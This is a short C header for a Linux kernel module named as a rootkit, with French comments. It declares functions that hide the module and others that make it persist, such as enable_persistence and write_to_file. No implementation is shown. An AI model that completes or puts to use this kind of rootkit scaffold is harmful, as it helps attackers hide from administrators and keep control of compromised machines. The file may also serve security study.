#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <linux/module.h>

/* Fonctions pour masquer et afficher le module */
int hide_init(struct module *mod);
void hide(struct module *mod, int hide);
void hide_exit(void);

/* Fonctions pour la persistence */
int write_to_file(const char *path, const char *data);
int enable_persistence(const char *module_name);

#endif /* ROOTKIT_H */
